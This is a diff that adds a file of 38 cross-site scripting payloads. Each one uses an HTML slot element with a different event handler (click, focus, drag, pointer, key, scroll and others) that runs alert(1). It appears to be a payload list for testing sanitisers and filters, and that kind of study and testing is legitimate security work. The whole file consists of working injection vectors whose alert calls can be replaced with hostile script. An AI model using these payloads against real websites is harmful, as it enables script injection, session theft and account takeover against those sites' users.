@@ -1,0 +1,38 @@
+<slot contenteditable onbeforeinput=alert(1)>test
+<slot draggable="true" ondrag="alert(1)" style=display:block>test</slot>
+<slot draggable="true" ondragend="alert(1)" style=display:block>test</slot>
+<slot draggable="true" ondragenter="alert(1)" style=display:block>test</slot>
+<slot draggable="true" ondragleave="alert(1)" style=display:block>test</slot>
+<slot draggable="true" ondragstart="alert(1)" style=display:block>test</slot>
+<slot id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></slot>
+<slot id=x tabindex=1 onfocus=alert(1)></slot>
+<slot id=x tabindex=1 onfocusin=alert(1)></slot>
+<slot onafterscriptexecute=alert(1)><script>1</script>
+<slot onbeforescriptexecute=alert(1)><script>1</script>
+<slot onblur=alert(1) id=x tabindex=1 style=display:block>test</slot><input value=clickme>
+<slot onclick="alert(1)" style=display:block>test</slot>
+<slot oncontextmenu="alert(1)" style=display:block>test</slot>
+<slot oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<slot oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<slot ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</slot>
+<slot onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</slot><input value=clickme>
+<slot onkeydown="alert(1)" contenteditable style=display:block>test</slot>
+<slot onkeypress="alert(1)" contenteditable style=display:block>test</slot>
+<slot onkeyup="alert(1)" contenteditable style=display:block>test</slot>
+<slot onmousedown="alert(1)" style=display:block>test</slot>
+<slot onmouseenter="alert(1)" style=display:block>test</slot>
+<slot onmouseleave="alert(1)" style=display:block>test</slot>
+<slot onmousemove="alert(1)" style=display:block>test</slot>
+<slot onmouseout="alert(1)" style=display:block>test</slot>
+<slot onmouseover="alert(1)" style=display:block>test</slot>
+<slot onmouseup="alert(1)" style=display:block>test</slot>
+<slot onmousewheel=alert(1) style=display:block>requires scrolling
+<slot onpointerdown=alert(1) style=display:block>XSS</slot>
+<slot onpointerenter=alert(1) style=display:block>XSS</slot>
+<slot onpointerleave=alert(1) style=display:block>XSS</slot>
+<slot onpointermove=alert(1) style=display:block>XSS</slot>
+<slot onpointerout=alert(1) style=display:block>XSS</slot>
+<slot onpointerover=alert(1) style=display:block>XSS</slot>
+<slot onpointerrawupdate=alert(1) style=display:block>XSS</slot>
+<slot onpointerup=alert(1) style=display:block>XSS</slot>
+<slot onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></slot>
